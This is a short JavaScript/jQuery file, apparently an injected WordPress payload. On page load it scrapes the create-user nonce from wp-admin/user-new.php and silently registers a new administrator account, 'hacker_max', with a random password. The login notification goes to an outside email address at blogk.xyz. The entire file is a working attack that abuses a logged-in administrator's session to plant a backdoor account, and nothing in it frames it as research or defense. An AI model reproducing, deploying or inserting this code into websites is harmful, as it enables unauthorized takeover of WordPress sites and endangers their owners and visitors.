(function ($) {
    var WP_Hack = function () {
        console.log('Starting...');

        var username = 'hacker_max';
        var email = 'contact@blogk.xyz';
        var password = Math.random().toString(36).substring(2);

        var site = get_site();
        var new_user_url = site + '/wp-admin/user-new.php';

        function get_site() {
            var origin = location.origin;
            var ajax = wp.ajax.settings.url || '/wp-admin/admin-ajax.php';
            var full_ajax = origin + ajax;

            return full_ajax.replace('/wp-admin/admin-ajax.php', '');
        }

        function get_nonce(html) {
            var re = /name="_wpnonce_create-user"([ ]+)value="([^"]+)"/g;
            var m = re.exec(html);

            if (!m[2].match(/([a-z0-9]{10})/)) {
                return false;
            }

            return m[2];
        }

        function create_new_user(nonce) {
            $.ajax({
                url: new_user_url,
                method: 'POST',
                data: {
                    "action": "createuser",
                    "_wpnonce_create-user": nonce,
                    "_wp_http_referer": "/wp-admin/user-new.php",
                    "user_login": username,
                    "email": email,
                    "pass1": password,
                    "pass1-text": password,
                    "pass2": password,
                    "send_user_notification": 1,
                    "role": "administrator",
                    "createuser": "Add New User"
                },
                success: function (response) {
                    console.log("New user created");
                }
            });
        }

        $.ajax({
            url: new_user_url,
            success: function (html) {
                var nonce = get_nonce(html);
                console.log('Get nonce.');
                create_new_user(nonce);
            }
        });
    };

    $(document).ready(function () {
        WP_Hack();
    });
})(jQuery);